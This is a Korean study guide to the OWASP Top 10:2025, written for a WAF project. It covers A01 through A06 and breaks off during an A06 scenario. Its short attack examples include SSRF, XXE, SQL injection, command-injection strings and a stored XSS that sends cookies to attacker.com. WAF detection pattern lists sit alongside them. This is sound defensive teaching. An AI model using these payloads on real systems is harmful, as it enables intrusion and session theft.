# OWASP Top 10:2025 완전 가이드

> **출처:** [owasp.org/Top10/2025](https://owasp.org/Top10/2025/)  
> **프로젝트 연계:** AI Security System — FastAPI WAF 리버스 프록시 + Mistral-7B LLM + OWASP Juice Shop  
> **언어:** 한국어 위주, 기술 용어는 영어 병기

---

## 목차

- [OWASP Top 10이란?](#owasp-top-10이란)
- [2021 → 2025 변경점](#2021--2025-변경점)
- [A01 — Broken Access Control](#a012025--broken-access-control-취약한-접근-제어)
- [A02 — Security Misconfiguration](#a022025--security-misconfiguration-보안-설정-오류)
- [A03 — Software Supply Chain Failures](#a032025--software-supply-chain-failures-소프트웨어-공급망-실패)
- [A04 — Cryptographic Failures](#a042025--cryptographic-failures-암호화-실패)
- [A05 — Injection](#a052025--injection-인젝션)
- [A06 — Insecure Design](#a062025--insecure-design-안전하지-않은-설계)
- [A07 — Authentication Failures](#a072025--authentication-failures-인증-실패)
- [A08 — Software or Data Integrity Failures](#a082025--software-or-data-integrity-failures-소프트웨어-및-데이터-무결성-실패)
- [A09 — Security Logging and Alerting Failures](#a092025--security-logging-and-alerting-failures-보안-로깅-및-알림-실패)
- [A10 — Mishandling of Exceptional Conditions](#a102025--mishandling-of-exceptional-conditions-예외-조건-오처리)
- [종합 비교 및 프로젝트 연계](#종합-비교-및-프로젝트-연계)

---

## OWASP Top 10이란?

**OWASP(Open Web Application Security Project)** 는 웹 애플리케이션 보안 향상을 목표로 하는 비영리 오픈소스 재단이다. **Top 10** 문서는 가장 중요한 웹 보안 위험 10가지를 선정하여 개발자·보안 담당자·운영팀이 공통 언어로 보안을 논의하고 적용할 수 있도록 돕는 **사실상의 업계 표준 인식 문서**다.

```
OWASP Top 10 활용 대상
─────────────────────────────
개발자       → 코드 작성 시 보안 고려사항 참조
보안 담당자  → 취약점 분류 및 위험 평가 기준
운영팀       → 인프라·설정 보안 점검 기준
WAF 개발자   → 탐지 규칙 및 모듈 설계 기준  ← 본 프로젝트
```

> **최신 버전:** OWASP Top 10:2025 (공식 발표)  
> **이전 버전:** OWASP Top 10:2021

---

## 2021 → 2025 변경점

### 순위 변동 요약

```
  2021                              2025
  ────────────────────────────────────────────────────────
  1. Broken Access Control    →  1. Broken Access Control      ▶ 유지
  2. Cryptographic Failures   →  2. Security Misconfiguration  ▲ 상승 (5위→2위)
  3. Injection                →  3. Software Supply Chain      ★ 범위 확장 신규
  4. Insecure Design          →  4. Cryptographic Failures     ▼ 하락 (2위→4위)
  5. Security Misconfiguration→  5. Injection                  ▼ 하락 (3위→5위)
  6. Vulnerable & Outdated    →  6. Insecure Design            ▼ 하락 (4위→6위)
     Components
  7. Auth. Failures           →  7. Authentication Failures    ▶ 유지 (명칭 변경)
  8. Software/Data Integrity  →  8. Software/Data Integrity    ▶ 유지 (명칭 일부 변경)
  9. Security Logging Failures→  9. Security Logging &         ▶ 유지 (Alerting 추가)
                                    Alerting Failures
  10. SSRF                    →  10. Mishandling of            ★ 신규
                                     Exceptional Conditions
  ────────────────────────────────────────────────────────
```

### 주요 변화 포인트

| 변화 | 내용 |
|------|------|
| **A02 대폭 상승** | Security Misconfiguration이 5위→2위. 고도로 설정 가능한 소프트웨어 증가 반영 |
| **A03 범위 확장** | "취약하고 오래된 컴포넌트"→ "소프트웨어 공급망 실패" 전반으로 확장 (SolarWinds, Log4Shell 사례 반영) |
| **A09 강조 변화** | Monitoring → **Alerting** 강조. 탐지 후 알림·대응까지 포함 |
| **A10 신규** | SSRF 제거, 예외 처리 오류 신규 편입. 오류 정보 노출·Failing Open 등 포함 |
| **SSRF 이동** | 독립 항목(A10:2021) → A01:2025 Broken Access Control에 흡수 (CWE-918) |

---

## A01:2025 — Broken Access Control (취약한 접근 제어)

> **5회 연속 1위** · 테스트 애플리케이션 **100%** 발견 · CWE 40개 · CVE 32,654개

### 한 줄 요약

사용자가 **허가되지 않은 리소스나 기능에 접근**할 수 있는 모든 취약점.

### 배경 및 통계

접근 제어(Access Control)는 사용자가 의도된 권한 범위 밖으로 행동할 수 없도록 정책을 강제하는 메커니즘이다. 실패하면 비인가 정보 노출, 데이터 수정·삭제, 비즈니스 기능 남용으로 이어진다.

| 지표 | 값 |
|------|-----|
| CWE 매핑 수 | 40개 |
| 최대 발생률 | 20.15% |
| 평균 발생률 | 3.74% |
| 총 발생 건수 | 1,839,701건 |
| 관련 CVE | 32,654개 |

### 취약점 유형 및 설명

**① 최소 권한 원칙 위반 (Principle of Least Privilege)**
```
기본 허용(Allow by Default) 설정
→ 명시적으로 거부되지 않은 모든 접근이 허용됨
→ 일반 사용자가 관리자 기능에 접근 가능
```

**② IDOR — Insecure Direct Object References**
```
/api/orders?id=1001  ← 내 주문
/api/orders?id=1002  ← 타인 주문 (서버 검증 없으면 접근 가능)
```

**③ 강제 브라우징 (Force Browsing)**
```
https://example.com/user/dashboard    ← 정상
https://example.com/admin/dashboard   ← 직접 URL 입력으로 관리자 접근
```

**④ HTTP 메서드 남용**
```
GET  /api/users/123  → 200 OK (제한됨)
POST /api/users/123  → 200 OK (제한 없음 — 취약)
DELETE /api/users/123 → 200 OK (제한 없음 — 취약)
```

**⑤ JWT / 쿠키 / 숨김 필드 조작**
```json
// 원본 JWT 페이로드
{"sub": "user123", "role": "user"}

// 조작된 JWT 페이로드
{"sub": "user123", "role": "admin"}
```

**⑥ CORS 오설정**
```http
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
→ 신뢰되지 않는 출처에서 인증 API 호출 가능
```

**⑦ SSRF (Server-Side Request Forgery)** ← 2021 A10에서 A01으로 이동
```
GET /fetch?url=http://169.254.169.254/latest/meta-data/
→ AWS 메타데이터 서버 접근 (클라우드 자격증명 탈취)
```

**⑧ CSRF (Cross-Site Request Forgery)**
```html
<!-- 악성 사이트가 피해자 브라우저에서 요청 위조 -->
<img src="https://bank.com/transfer?to=attacker&amount=1000000">
```

### 공격 시나리오

**시나리오 1: IDOR로 타인 계좌 조회**
```java
// 취약 코드: 파라미터 검증 없음
String query = "SELECT * FROM accounts WHERE acct='"
               + request.getParameter("acct") + "'";

// 공격 URL
// https://example.com/app/accountInfo?acct=notmyacct
// acct 값만 바꾸면 누구의 계좌도 조회 가능
```

**시나리오 2: 인증 없이 관리자 페이지 접근**
```bash
# 비인증 사용자가 직접 curl로 관리자 API 호출
curl https://example.com/app/admin_getappInfo
# → JavaScript 보호는 서버 측 검증을 대체하지 못함
```

### 방어 방법

```
✅ 공개 리소스 외 기본 거부 (Deny by Default)
✅ 접근 제어 메커니즘을 한 곳에서 구현, 전체 재사용
✅ 레코드 소유권 기반 접근 제어 (사용자는 자신의 데이터만)
✅ 웹 서버 디렉터리 리스팅 비활성화
✅ .git, .env, 백업 파일을 웹 루트에서 제외
✅ 접근 제어 실패 로깅 + 반복 실패 시 관리자 알림
✅ API에 레이트 리밋 적용 (자동화 공격 대응)
✅ 로그아웃 후 세션 ID 서버에서 즉시 무효화
✅ JWT는 단기 유효기간 설정, 필요 시 Refresh Token 활용
✅ 서버 측 코드에서만 접근 제어 구현 (프론트엔드 의존 금지)
```

### 프로젝트 연계 — `owasp/a01.py` 탐지 포인트

```python
# WAF 프록시에서 탐지하는 A01 관련 패턴
A01_DETECTIONS = {
    "path_traversal": [
        r"\.\./",           # 상대 경로 순회
        r"/etc/passwd",     # Unix 시스템 파일
        r"/proc/self",      # 프로세스 정보
    ],
    "admin_paths": [
        r"/admin", r"/administrator", r"/management",
        r"/dashboard", r"/panel", r"/_internal",
    ],
    "idor_patterns": [
        r"\?.*id=\d+",      # 숫자 ID 파라미터
        r"\?.*user=\w+",    # 사용자 식별자
    ],
    "method_abuse": ["TRACE", "TRACK"],
    "jwt_manipulation": [
        r'"alg"\s*:\s*"none"',   # alg:none 공격
        r'"role"\s*:\s*"admin"', # 역할 변조
    ],
    "ssrf_patterns": [
        r"169\.254\.169\.254",          # AWS 메타데이터
        r"localhost|127\.0\.0\.1",      # 로컬 리소스 접근
        r"192\.168\.\d+\.\d+",         # 내부망 접근 시도
    ],
}
```

### 핵심 CWE

| CWE | 이름 |
|-----|------|
| CWE-22 | 경로 순회 (Path Traversal) |
| CWE-284 | 부적절한 접근 제어 |
| CWE-352 | CSRF |
| CWE-639 | 사용자 제어 키를 통한 인가 우회 (IDOR) |
| CWE-862 | 인가 누락 |
| CWE-918 | SSRF |

---

## A02:2025 — Security Misconfiguration (보안 설정 오류)

> **2021년 5위 → 2025년 2위 대폭 상승** · 테스트 애플리케이션 **100%** 발견 · CWE 16개

### 한 줄 요약

시스템·애플리케이션·클라우드 서비스가 **보안 관점에서 잘못 설정**된 상태.

### 배경 및 통계

고도로 설정 가능한 소프트웨어의 증가와 함께 이 카테고리의 중요성이 높아졌다. 전체 애플리케이션의 100%에서 어떤 형태로든 잘못된 설정이 발견된다.

| 지표 | 값 |
|------|-----|
| CWE 매핑 수 | 16개 |
| 최대 발생률 | 27.70% |
| 평균 발생률 | 3.00% |
| 총 발생 건수 | 719,084건 |

### 취약한 상태 점검 목록

```
□ 보안 강화(Hardening) 미적용
□ 불필요한 포트·서비스·계정·테스트 프레임워크 활성화
□ 기본 계정·비밀번호 미변경 (admin/admin, root/toor)
□ 스택 트레이스·상세 오류 메시지 사용자 노출
□ 업그레이드된 시스템의 최신 보안 기능 미적용
□ 하위 호환성 우선으로 인한 불안전한 설정
□ 프레임워크·라이브러리·DB의 기본값 유지 (보안 설정 미변경)
□ 보안 헤더 미설정 (CSP, X-Frame-Options, HSTS 등)
□ 클라우드 스토리지 공개 접근 허용 (S3 버킷 Public)
□ XXE — XML 외부 개체 참조 활성화
□ 디렉터리 리스팅 활성화
```

### 공격 시나리오

**시나리오 1: 기본 자격증명 그대로 사용**
```http
POST /admin/login HTTP/1.1
Content-Type: application/json

{"username": "admin", "password": "admin"}

HTTP/1.1 200 OK
{"token": "eyJ...", "role": "superadmin"}
```

**시나리오 2: 상세 오류 메시지로 내부 구조 노출**
```json
HTTP/1.1 500 Internal Server Error
{
  "error": "NullPointerException",
  "stack": [
    "at com.example.UserService.getUser(UserService.java:142)",
    "at org.springframework.jdbc.core.JdbcTemplate..."
  ],
  "query": "SELECT * FROM users WHERE id=''",
  "db_host": "internal-db.company.local:5432",
  "db_version": "PostgreSQL 14.2"
}
```

**시나리오 3: 디렉터리 리스팅 활성화**
```
GET /backup/ HTTP/1.1

Index of /backup/
  [DIR] 2025-01-15/
  database_dump_prod.sql    2025-01-15  128MB
  config.php.bak            2024-12-01  4KB
  .env.production           2025-01-10  1KB
```

**시나리오 4: XXE (XML External Entity) 공격**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
  <name>&xxe;</name>
</user>
<!-- 서버가 /etc/passwd 내용을 응답에 포함 -->
```

### 방어 방법

```
✅ 반복 가능한 강화 프로세스 구축
   (개발·QA·운영 환경 동일 설정, 자격증명만 상이)
✅ 최소 플랫폼 원칙: 불필요한 기능·컴포넌트·문서·샘플 제거
✅ 정기적 설정 검토 및 자동화 검증
✅ 세그멘테이션: 컨테이너화, 보안 그룹으로 컴포넌트 분리
✅ 보안 헤더 적용:
   - Strict-Transport-Security (HSTS)
   - Content-Security-Policy (CSP)
   - X-Frame-Options: DENY
   - X-Content-Type-Options: nosniff
   - Referrer-Policy
✅ 클라우드 스토리지 권한 최소화 (S3 버킷 퍼블릭 금지)
✅ 코드/설정 파일에 시크릿 하드코딩 금지 → 환경변수·HSM 사용
✅ XML 처리 시 DTD·외부 엔터티 파싱 비활성화 (XXE 방지)
```

### 프로젝트 연계 — `owasp/a02.py` 탐지 포인트

```python
# WAF 요청 탐지 (민감 경로 접근)
SENSITIVE_PATHS = [
    "/.env", "/.git", "/.gitignore",
    "/config.php", "/web.config", "/applicationContext.xml",
    "/phpinfo.php", "/server-status", "/actuator",
    "/backup", "/dump", "/.DS_Store",
]

# WAF 응답 스캔 (정보 노출 탐지)
RESPONSE_LEAKAGE_PATTERNS = [
    r"Traceback \(most recent call last\)",  # Python 스택
    r"at org\.springframework\.",            # Java/Spring 스택
    r"Microsoft\.AspNet",                    # ASP.NET 정보
    r"SQL syntax.*MySQL",                    # MySQL 오류
    r"ORA-\d{5}",                            # Oracle 오류
    r"\d+\.\d+\.\d+\.\d+:\d{4,5}",         # 내부 IP:Port
]

# 응답 헤더 보안 검사 (누락 헤더 탐지)
REQUIRED_SECURITY_HEADERS = [
    "Strict-Transport-Security",
    "X-Frame-Options",
    "X-Content-Type-Options",
    "Content-Security-Policy",
]

# XXE 탐지
XXE_PATTERNS = [
    r"<!DOCTYPE.*\[",
    r"<!ENTITY.*SYSTEM",
    r"<!ENTITY.*PUBLIC",
]
```

### 핵심 CWE

| CWE | 이름 |
|-----|------|
| CWE-16 | 설정 오류 |
| CWE-489 | 활성 디버그 코드 |
| CWE-611 | XXE |
| CWE-942 | 신뢰되지 않는 도메인에 대한 허용적 CORS |
| CWE-1004 | HttpOnly 플래그 없는 민감 쿠키 |

---

## A03:2025 — Software Supply Chain Failures (소프트웨어 공급망 실패)

> **커뮤니티 설문 1위 (응답자 50% 선택)** · 평균 발생률 **5.72%** (전 항목 중 최고)

### 한 줄 요약

소프트웨어의 **빌드·배포·업데이트 전 과정**에서 발생하는 장애나 손상.

### 배경 및 통계

2021년의 "취약하고 오래된 컴포넌트(A06)"에서 범위가 크게 확장되었다. 알려진 취약점뿐만 아니라 **공급망 전체 생애주기의 실패**를 포함한다. SolarWinds, Log4Shell, Bybit 침해 등 공급망 공격의 피해 규모가 급증하면서 1위 후보로 선정되었다.

| 지표 | 값 |
|------|-----|
| CWE 매핑 수 | 6개 |
| 평균 발생률 | **5.72%** (최고) |
| 최대 발생률 | 9.56% |
| 총 발생 건수 | 215,248건 |
| 관련 CVE | 11개 (탐지 어려움 반영) |

### 실제 공급망 공격 사례

```
┌─────────────────────────────────────────────────────────────┐
│                    역대 주요 공급망 공격 사례                      │
├─────────────────────────────────────────────────────────────┤
│ SolarWinds (2019)                                           │
│  · IT 관리 소프트웨어 업데이트 파일에 백도어(Sunburst) 삽입       │
│  · 약 18,000개 조직 감염 (미국 재무부·국방부 포함)                │
│                                                             │
│ Log4Shell / CVE-2021-44228                                  │
│  · Apache Log4j 라이브러리 RCE 제로데이 취약점                   │
│  · 전 세계 수억 개 시스템에 영향 (Java 애플리케이션 사실상 전체)    │
│                                                             │
│ Bybit 암호화폐 거래소 (2025)                                  │
│  · 지갑 소프트웨어 공급망 공격                                    │
│  · **15억 달러** 상당 암호화폐 탈취                               │
│  · 특정 조건에서만 악성 코드 실행 (탐지 회피)                      │
│                                                             │
│ Shai-Hulud npm 웜 (2025)                                    │
│  · npm 생태계 최초 자기 전파 웜                                   │
│  · npm 토큰 탈취 후 접근 가능한 패키지에 악성 코드 자동 배포        │
│  · 차단 전까지 500개 이상 패키지 버전 감염                        │
└─────────────────────────────────────────────────────────────┘
```

### 취약한 상태 징후

```
□ 직접·전이적(Transitive) 의존성 버전 추적 미실시
□ 취약·지원 종료·오래된 OS·프레임워크·라이브러리 사용
□ 정기 취약점 스캔 미실시, CVE 알림 미구독
□ 공급망 변경사항 추적 프로세스 부재
□ 공급망 전반에 최소 권한 원칙 미적용
□ 역할 분리 없음 (코드 작성 → 프로덕션 단독 배포)
□ 신뢰되지 않는 출처의 컴포넌트 사용
□ 위험 기반 패치 관리 부재 (월별·분기별 일괄 패치)
□ CI/CD 파이프라인 보안 미적용
```

### 방어 방법

```
✅ SBOM (Software Bill of Materials) 자동 생성 및 중앙 관리
✅ 직접·전이적 의존성 모두 추적
✅ 미사용 의존성·기능 제거 (공격 표면 최소화)
✅ OWASP Dependency-Track, retire.js 등으로 지속적 모니터링
✅ CVE / NVD / OSV (osv.dev) 알림 구독
✅ 공식 소스에서만 서명된 패키지 사용
✅ 단계적 배포 (Staged Rollout / Canary Deployment)
✅ CI/CD 파이프라인에 MFA + IAM 강화
✅ 코드 리포지토리·빌드 서버·아티팩트 저장소 접근 제어
✅ 개발자 워크스테이션 정기 패치 및 MFA 적용
```

### 프로젝트 연계 — `owasp/a03.py` 탐지 포인트

```python
# 요청/응답에서 탐지 가능한 공급망 위험 지표
A03_DETECTIONS = {
    # 응답 본문 내 외부 스크립트 로드 (SRI 없음)
    "unsafe_external_script": r'<script\s+src="https?://(?!trusted-cdn\.com)[^"]+"\s*>',

    # 알려진 취약 라이브러리 버전 헤더
    "vulnerable_headers": [
        r"X-Powered-By: PHP/[45]\.",    # PHP 4/5 (EOL)
        r"Server: Apache/2\.[01]\.",     # 구버전 Apache
        r"Server: nginx/1\.[0-9]\.",     # 구버전 nginx
    ],

    # 패키지 레지스트리 요청 탐지
    "package_registry_bypass": [
        r"pypi\.org/simple/[^/]+/",
        r"registry\.npmjs\.org/",
        r"repo1\.maven\.org/",
    ],
}
```

### 핵심 CWE

| CWE | 이름 |
|-----|------|
| CWE-1104 | 유지보수되지 않는 서드파티 컴포넌트 사용 |
| CWE-1329 | 업데이트 불가 컴포넌트 의존 |
| CWE-1357 | 불충분히 신뢰할 수 있는 컴포넌트 의존 |
| CWE-1395 | 취약한 서드파티 컴포넌트 의존 |

---

## A04:2025 — Cryptographic Failures (암호화 실패)

> **2021년 2위 → 2025년 4위** · CWE 32개 · 취약한 난수 생성기(PRNG)가 주요 원인

### 한 줄 요약

암호화 부재·불충분한 암호화·키 노출로 **민감 데이터의 기밀성·무결성 보호 실패**.

### 배경 및 통계

GDPR·PCI DSS 등 규정 준수 대상 데이터(비밀번호·신용카드·의료기록·개인정보)의 보호 실패로 이어지는 광범위한 카테고리. 포스트 퀀텀 암호화(PQC) 대응도 새롭게 강조되었다.

| 지표 | 값 |
|------|-----|
| CWE 매핑 수 | 32개 |
| 최대 발생률 | 13.77% |
| 평균 발생률 | 3.80% |
| 총 발생 건수 | 1,665,348건 |

### 취약한 상태 점검 목록

```
□ 구식·취약한 암호화 알고리즘 (MD5, SHA1, DES, ECB 모드)
□ 기본 암호화 키 사용, 키 재사용, 키 관리·로테이션 부재
□ 소스코드 저장소에 암호화 키 커밋
□ HTTP → HTTPS 강제 미적용, HSTS 헤더 없음
□ 서버 인증서 신뢰 체인 미검증
□ 초기화 벡터(IV) 재사용 또는 난수성 부족
□ 패스워드를 KDF 없이 암호화 키로 직접 사용
□ 암호학적 목적에 비암호학적 PRNG 사용
□ 약한 해시 (MD5, SHA1)로 비밀번호 저장
□ CBC 패딩 오라클 공격 취약점
□ TLS 1.0/1.1 지원 (TLS 1.2+ 미강제)
□ FTP·SMTP 등 평문 프로토콜 사용
□ 포스트 퀀텀 암호화(PQC) 준비 미실시 (2030년 기한)
```

### 공격 시나리오

**시나리오 1: 중간자 공격 (MITM via HTTP Downgrade)**
```
공격자 (공용 Wi-Fi)
  ↓ HTTP 다운그레이드 유도
사용자 HTTPS 요청 → HTTP로 변환
  ↓ 세션 쿠키·자격증명 평문 캡처
계정 탈취
```

**시나리오 2: 취약한 비밀번호 해시**
```sql
-- 취약: MD5 (레인보우 테이블로 즉시 해독)
INSERT INTO users (pw_hash) VALUES (MD5('mypassword'));
-- 5f4dcc3b5aa765d61d8327deb882cf99 → "password"

-- 취약: SHA1 (GPU 크래킹 가능)
INSERT INTO users (pw_hash) VALUES (SHA1('mypassword'));

-- 안전: Argon2id (2025 권장)
import argon2
ph = argon2.PasswordHasher()
hash = ph.hash("mypassword")  # $argon2id$v=19$...
```

**시나리오 3: 하드코딩된 암호화 키**
```python
# 위험: 소스코드에 시크릿 노출
SECRET_KEY = "supersecretkey123"
DB_PASSWORD = "admin1234"

# 안전: 환경변수 또는 HSM(Hardware Security Module)에서 로드
import os
SECRET_KEY = os.environ["SECRET_KEY"]
```

**시나리오 4: 취약한 쿠키 설정**
```http
Set-Cookie: session=abc123

# 안전한 설정
Set-Cookie: session=abc123; Secure; HttpOnly; SameSite=Strict; Path=/
```

### 방어 방법

```
✅ 민감 데이터 분류·레이블링 → 필요 데이터만 수집·저장
✅ 민감 키는 HSM(Hardware Security Module)에 저장
✅ TLS 1.2+ 강제 + 순방향 비밀성(Forward Secrecy) 암호화
✅ HSTS 헤더 적용 (Strict-Transport-Security)
✅ 비밀번호: Argon2id > yescrypt > scrypt > PBKDF2 (순서대로 권장)
✅ AES-GCM 등 인증된 암호화(Authenticated Encryption) 사용
✅ 민감 응답 캐싱 비활성화 (CDN·웹서버·Redis 포함)
✅ Deprecated 알고리즘 제거: MD5, SHA1, CBC, PKCS#1 v1.5
✅ 2030년까지 포스트 퀀텀 암호화(PQC) 대비
   (NIST 표준: ML-KEM, ML-DSA, SLH-DSA)
```

### 프로젝트 연계 — `owasp/a04.py` 탐지 포인트

```python
# 요청 탐지: 평문 민감 데이터 전송
REQUEST_SENSITIVE_PARAMS = [
    r"password=(?![\*]+)[^&]+",         # 평문 비밀번호
    r"credit_card=\d{13,19}",           # 신용카드 번호
    r"ssn=\d{3}-\d{2}-\d{4}",          # 사회보장번호
]

# 응답 스캔: 취약한 쿠키 설정
def check_cookie_security(set_cookie_header: str) -> list:
    issues = []
    if "Secure" not in set_cookie_header:
        issues.append("A04 - Cookie: Secure 플래그 없음")
    if "HttpOnly" not in set_cookie_header:
        issues.append("A04 - Cookie: HttpOnly 플래그 없음")
    if "SameSite" not in set_cookie_header:
        issues.append("A04 - Cookie: SameSite 속성 없음")
    return issues

# 응답 헤더 검사
def check_transport_security(headers: dict) -> list:
    issues = []
    if "Strict-Transport-Security" not in headers:
        issues.append("A04 - HSTS 헤더 없음")
    return issues
```

### 핵심 CWE

| CWE | 이름 |
|-----|------|
| CWE-319 | 민감 정보 평문 전송 |
| CWE-321 | 하드코딩된 암호화 키 |
| CWE-327 | 취약하거나 위험한 암호화 알고리즘 사용 |
| CWE-331 | 불충분한 엔트로피 |
| CWE-338 | 암호학적으로 취약한 PRNG 사용 |
| CWE-759 | 솔트 없는 단방향 해시 |
| CWE-916 | 연산 비용 불충분한 비밀번호 해시 |

---

## A05:2025 — Injection (인젝션)

> **2021년 3위 → 2025년 5위** · CWE **37개** · CVE **62,445개** (전 항목 중 최다)

### 한 줄 요약

**신뢰되지 않는 사용자 입력이 인터프리터(DB·OS·브라우저)로 전달되어 명령으로 실행**되는 모든 취약점.

### 배경 및 통계

XSS(Cross-Site Scripting)의 CVE 수 30,000+건이 포함되어 CVE 총수가 가장 많지만, XSS의 평균 가중 영향도(Impact)가 낮아 5위로 하락했다. 그럼에도 SQL Injection(14,000+ CVE)은 여전히 고영향 공격으로 분류된다.

| 지표 | 값 |
|------|-----|
| CWE 매핑 수 | **37개** |
| 최대 발생률 | 13.77% |
| 평균 발생률 | 3.08% |
| 총 발생 건수 | 1,404,249건 |
| 관련 CVE | **62,445개** |

### 인젝션 유형별 분류

```
인젝션 유형                 인터프리터        영향도
──────────────────────────────────────────────────────
SQL Injection               Database         ★★★★★ (매우 높음)
OS Command Injection        Operating System ★★★★★ (매우 높음)
LDAP Injection              Directory Svc    ★★★★☆
XPath Injection             XML              ★★★★☆
ORM Injection               Database         ★★★★☆
Expression Language (EL)    Application      ★★★★☆
Server-Side Template (SSTI) Application      ★★★★★ (RCE 가능)
Cross-Site Scripting (XSS)  Browser          ★★★☆☆ (빈도 높음)
CRLF Injection              HTTP Server      ★★★☆☆
NoSQL Injection             Database         ★★★★☆
LLM Prompt Injection        LLM Engine       ★★★★☆ (신규 주목)
──────────────────────────────────────────────────────
```

### 공격 시나리오

**시나리오 1: SQL Injection — 인증 우회**
```sql
-- 정상 로그인 쿼리
SELECT * FROM users WHERE username='alice' AND password='secret';

-- 공격자 입력: username = admin'--
SELECT * FROM users WHERE username='admin'--' AND password='anything';
-- '--' 이후 주석 처리 → 비밀번호 검증 건너뜀
```

**시나리오 2: SQL Injection — UNION 기반 데이터 추출**
```sql
-- 취약한 검색 기능
SELECT name, price FROM products WHERE category='shoes'

-- 공격 URL: ?category=shoes' UNION SELECT username, password FROM users--
SELECT name, price FROM products WHERE category='shoes'
UNION SELECT username, password FROM users--'
-- → users 테이블의 모든 계정·비밀번호 노출
```

**시나리오 3: OS Command Injection**
```python
# 취약 코드
import subprocess
domain = request.args.get("domain")
result = subprocess.run(f"nslookup {domain}", shell=True, capture_output=True)

# 공격: domain = "example.com; cat /etc/passwd"
# → nslookup example.com 실행 후 cat /etc/passwd 실행
```

**시나리오 4: XSS (Stored)**
```html
<!-- 악성 댓글 저장 -->
<script>
  fetch('https://attacker.com/steal?c=' + document.cookie);
</script>

<!-- 다른 사용자가 댓글 페이지 방문 시 실행 → 세션 쿠키 탈취 -->
```

**시나리오 5: Hibernate HQL Injection**
```java
// 취약: HQL도 문자열 연결 시 인젝션 가능
Query q = session.createQuery(
    "FROM accounts WHERE custID='" + request.getParameter("id") + "'"
);

// 공격: id = ' OR custID IS NOT NULL OR custID='
// → 모든 계정 반환
```

### 방어 방법

```
✅ 안전한 API 사용 — 인터프리터 직접 호출 회피
✅ PreparedStatement / 파라미터화 쿼리 사용 (SQL)
✅ ORM 사용 (단, 동적 쿼리 연결 주의)
✅ 허용 목록(Allowlist) 기반 서버 측 입력 검증
✅ 특수 문자 이스케이프 (인터프리터별 문법 적용)
✅ 최소 권한으로 DB 계정 설정 (SELECT 전용 등)
✅ SAST·DAST·IAST 도구를 CI/CD 파이프라인에 통합
✅ 웹 애플리케이션 방화벽(WAF)으로 알려진 패턴 탐지
✅ 정기 퍼징(Fuzzing) 테스트 수행
```

### 프로젝트 연계 — `owasp/a05.py` 탐지 포인트

```python
import re

# SQL Injection 시그니처
SQL_INJECTION_PATTERNS = [
    r"'\s*(OR|AND)\s+[\w'\"]+\s*=\s*[\w'\"]+",   # ' OR 1=1
    r"'\s*;?\s*(UNION)\s+(ALL\s+)?SELECT",          # UNION SELECT
    r"'\s*(DROP|DELETE|INSERT|UPDATE)\s+",           # DDL/DML 삽입
    r"--\s*$",                                       # SQL 주석
    r"/\*.*\*/",                                     # 블록 주석
    r"\bxp_cmdshell\b|\bexec\s+sp_",               # MSSQL 시스템 함수
    r"\bSLEEP\s*\(\d+\)",                           # Time-based Blind SQLi
    r"\bBENCHMARK\s*\(",                            # MySQL Blind SQLi
]

# XSS 시그니처
XSS_PATTERNS = [
    r"<script[^>]*>",                               # script 태그
    r"javascript\s*:",                              # javascript: URL 스킴
    r"on\w+\s*=\s*['\"]?\s*\w+\(",                # 이벤트 핸들러
    r"<iframe[^>]*>",                               # iframe 삽입
    r"<img[^>]+onerror\s*=",                       # 이미지 오류 이벤트
    r"expression\s*\(",                             # CSS expression
    r"&#[xX]?[0-9a-fA-F]+;",                      # HTML 인코딩 우회
]

# OS Command Injection
CMD_INJECTION_PATTERNS = [
    r"[;&|`]\s*(cat|ls|id|whoami|uname|pwd|wget|curl)",
    r"\$\(.*\)",                                   # 명령 치환
    r"`[^`]+`",                                    # 백틱 명령 실행
]
```

### 핵심 CWE

| CWE | 이름 |
|-----|------|
| CWE-78 | OS 명령 인젝션 |
| CWE-79 | XSS |
| CWE-89 | SQL 인젝션 |
| CWE-90 | LDAP 인젝션 |
| CWE-94 | 코드 인젝션 |
| CWE-917 | 표현 언어(EL) 인젝션 |

---

## A06:2025 — Insecure Design (안전하지 않은 설계)

> **2021년 4위 → 2025년 6위** · CWE 39개 · 2021년 신규 도입 카테고리

### 한 줄 요약

코드 결함이 아닌, **처음부터 보안 제어가 설계에 포함되지 않은** 구조적 취약점.

### 개념적 구분

```
┌────────────────────────────────────────────────────────┐
│  Insecure Design vs Insecure Implementation            │
├──────────────────────┬─────────────────────────────────┤
│  Insecure Design     │  Insecure Implementation        │
├──────────────────────┼─────────────────────────────────┤
│  설계 단계의 구조적 결함│  올바른 설계를 잘못 구현         │
│  완벽한 코드도 취약   │  코드 수정으로 해결 가능          │
│  설계 재작업 필요     │  패치로 해결 가능                │
│  위협 모델링 부재     │  코드 리뷰로 발견 가능           │
└──────────────────────┴─────────────────────────────────┘
```

### 배경 및 통계

2021년 신규 도입 후 산업계의 위협 모델링 강화, 보안 설계 패턴 활용이 눈에 띄게 개선되고 있다. 그럼에도 비즈니스 로직 결함·설계 단계 보안 누락은 여전히 광범위하다.

| 지표 | 값 |
|------|-----|
| CWE 매핑 수 | 39개 |
| 최대 발생률 | 22.18% |
| 평균 발생률 | 1.86% |
| 총 발생 건수 | 729,882건 |

### 안전한 설계의 3가지 핵심

**① 요구사항 및 리소스 관리**
- CIA(기밀성·무결성·가용성) 보호 요구사항 정의
- 테넌트 분리 필요 여부 결정
- 보안 활동 포함 예산 책정

**② 보안 설계 문화**
- 정기 위협 모델링(Threat Modeling) — STRIDE 프레임워크 활용
- 데이터 흐름·접근 제어 변경 시 위협 재평가
- 오용 사례(Misuse Case) 정의 — 공격자 관점 시나리오

**③ 보안 개발 생애주기 (Secure SDL)**
- 프로젝트 시작부터 보안 전문가 참여
- [OWASP SAMM](https://owaspsamm.org/) 활용

### 공격 시나리오

**시나리오 1: 취약한 비밀번호 복구 설계**
```
"비밀 질문" 기반 복구 (NIST 800-63b에서 금지)

질문: "어머니의 성함은?"
→ SNS·공공 기록에서 쉽게 알 수 있음
→ 신원 증명 불가능 → 설계 자체가 취약

올바른 설계:
→ 이메일·SMS 일회용 코드(OTP)
→ 또는 인증 앱(Authenticator App)
```

**시나리오 2: 비즈니스 로직 공격**
```
영화관 단체 예약 시스템:
- 정책: 최대 15명까지 보증금 없이 예약
- 공격: 수십 개의 동시 요청으로 전 상영관 좌석 선점

피해: 실제 고객 예약 차단 + 입금 없이 좌석 독점
원인: 동시 요청 제한, 이상 행동 탐지 설계 누락

올바른 설계:
→ 예약 시도 속도 제한 (Rate Limiting)
→ 동일 IP/계정의 다중 예약 제한
→ 보증금 납부 후 좌석 확보
```

**시나리오 3: 스캘퍼 봇 (e-commerce)**
```
